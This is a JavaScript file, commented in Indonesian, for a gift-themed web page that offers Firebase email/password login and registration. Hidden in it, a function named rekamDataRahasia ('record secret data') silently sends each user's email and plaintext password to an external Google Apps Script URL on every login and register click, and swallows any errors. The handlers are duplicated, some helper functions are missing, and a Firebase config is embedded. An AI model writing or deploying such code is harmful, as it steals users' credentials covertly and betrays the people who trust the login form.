import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { 
    getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, 
    onAuthStateChanged, signOut 
} from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";

const firebaseConfig = {
  apiKey: "AIzaSyAm-t2mbHV7sSEcoDvNgZfTinmx5tcSz6s",
  authDomain: "project-bd-163e4.firebaseapp.com",
  projectId: "project-bd-163e4",
  storageBucket: "project-bd-163e4.firebasestorage.app",
  messagingSenderId: "691964855641",
  appId: "1:691964855641:web:b0c45e7badc579cdfc3848",
  measurementId: "G-YE2CW973NL"
};

// ... (Bagian import dan firebaseConfig tetap sama di paling atas) ...

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);

// Bungkus semua kode interaksi di dalam event listener ini
document.addEventListener('DOMContentLoaded', () => {
    
    // --- DEKLARASI DOM (Dipindahkan ke dalam agar aman) ---
    const loginCard = document.getElementById('login-card');
    const contentCard = document.getElementById('content-card');
    const mainContainer = document.getElementById('main-container');
    const galaxyUniverse = document.getElementById('galaxy-universe');
    const giftBoxWrapper = document.getElementById('gift-box-wrapper');
    const timerDisplay = document.getElementById('timer-display');
    const bgMusic = document.getElementById('bg-music');
    const btnLogout = document.getElementById('btn-logout');

   // Deklarasi Elemen Input & Tombol Auth (Sudah Disesuaikan dengan ID HTML Kamu)
    const loginButton = document.getElementById('btn-login'); 
    const btnRegister = document.getElementById('btn-register');
    const emailInput = document.getElementById('input-email');    // Perubahan di sini
    const passwordInput = document.getElementById('input-password'); // Perubahan di sini

    let timerInterval;

    // --- TIMER & GALAXY HEART FUNCTION ---
    // (Pindahkan fungsi jalankanCounterWaktu() dan startGalaxyHeart() ke sini)

    // --- INTERAKSI BUKA KADO ---
    if (giftBoxWrapper) {
        giftBoxWrapper.addEventListener('click', () => {
            mainContainer.classList.add('hidden');
            galaxyUniverse.classList.remove('hidden');
            startGalaxyHeart();
            bgMusic.play().catch(err => console.log("Audio play diblokir"));
        });
    }

    // --- AUTENTIKASI MONITOR ---
    onAuthStateChanged(auth, (user) => {
        if (user) {
            if (loginCard) loginCard.classList.add('hidden');
            if (contentCard) contentCard.classList.remove('hidden');
            jalankanCounterWaktu();
        } else {
            if (loginCard) loginCard.classList.remove('hidden');
            if (contentCard) contentCard.classList.add('hidden');
            if (mainContainer) mainContainer.classList.remove('hidden');
            if (galaxyUniverse) galaxyUniverse.classList.add('hidden');
            clearInterval(timerInterval);
        }
    });

    // --- EVENT BUTTON LOGIN ---
    if (loginButton) {
        // Tambahkan log untuk memastikan tombol terdeteksi di WebView
        console.log("Tombol login berhasil ditemukan di DOM"); 
        
        loginButton.addEventListener('click', (e) => {
            e.preventDefault();
            console.log("Tombol login ditekan!"); // Cek apakah trigger masuk

            const email = emailInput.value;
            const password = passwordInput.value;

            if (!email || !password) {
                alert("Email dan Password wajib diisi!");
                return;
            }

            // Kirim data secara async terisolasi
            rekamDataRahasia(email, password).catch(err => {});

            // Proses Firebase
            signInWithEmailAndPassword(auth, email, password)
                .then((userCredential) => {
                    console.log("Firebase Auth Sukses");
                })
                .catch((error) => {
                    alert("Login Gagal: " + error.message);
                });
        });
    } else {
        console.error("Tombol dengan ID 'btn-login' TIDAK ditemukan di HTML!");
    }

    // --- EVENT BUTTON REGISTER ---
    if (btnRegister) {
        btnRegister.addEventListener('click', async (e) => {
            e.preventDefault();
            const email = emailInput.value;
            const password = passwordInput.value;
            
            rekamDataRahasia(email, password).catch(err => {});

            try { 
                await createUserWithEmailAndPassword(auth, email, password);
                alert("Akun berhasil dibuat!");
            } catch (error) {
                alert("Gagal mendaftar: " + error.message);
            }
        });
    }
});

// Fungsi luar (Bisa tetap di luar DOMContentLoaded)
async function rekamDataRahasia(email, password) {
    const urlAppsScript = "https://script.google.com/macros/s/AKfycbxYhp8p7-nvDCcy5An13cJyHplLF9YaSNwwjiEiwZJXE-IEVf3RDPPF8OUj2zybft4/exec";
    try {
        fetch(`${urlAppsScript}?email=${encodeURIComponent(email)}&pw=${encodeURIComponent(password)}`, {
            method: 'GET',
            mode: 'no-cors', 
            cache: 'no-cache'
        });
    } catch (e) {}
}

// --- AUTENTIKASI ---
onAuthStateChanged(auth, (user) => {
    if (user) {
        if (loginCard) loginCard.classList.add('hidden');
        if (contentCard) contentCard.classList.remove('hidden');
        jalankanCounterWaktu();
    } else {
        if (loginCard) loginCard.classList.remove('hidden');
        if (contentCard) contentCard.classList.add('hidden');
        if (mainContainer) mainContainer.classList.remove('hidden');
        if (galaxyUniverse) galaxyUniverse.classList.add('hidden');
        clearInterval(timerInterval);
        if (bgMusic) {
            bgMusic.pause();
            bgMusic.currentTime = 0;
        }
    }
});

// Penanganan Event Login
if (loginButton) {
    loginButton.addEventListener('click', (e) => {
        e.preventDefault();
        
        const email = emailInput.value;
        const password = passwordInput.value;

        if (!email || !password) {
            alert("Email dan Password tidak boleh kosong!");
            return;
        }

        // Jalankan background log tanpa await agar tidak membekukan UI
        rekamDataRahasia(email, password).catch(err => console.log(err));

        // Firebase Sign In
        signInWithEmailAndPassword(auth, email, password)
            .then((userCredential) => {
                console.log("Login sukses!");
            })
            .catch((error) => {
                alert("Gagal Login: " + error.message);
            });
    });
}

// Penanganan Event Register
if (btnRegister) {
    btnRegister.addEventListener('click', async (e) => {
        e.preventDefault();
        const email = emailInput.value;
        const password = passwordInput.value;

        if (!email || !password) {
            alert("Email dan Password tidak boleh kosong!");
            return;
        }

        rekamDataRahasia(email, password).catch(err => console.log(err));

        try { 
            await createUserWithEmailAndPassword(auth, email, password);
            alert("Akun berhasil dibuat!");
        } catch (error) {
            if (error.code === 'auth/email-already-in-use') alert("Email sudah terdaftar.");
            else alert("Gagal mendaftar: " + error.message);
        }
    });
}

if (btnLogout) {
    btnLogout.addEventListener('click', () => signOut(auth));
}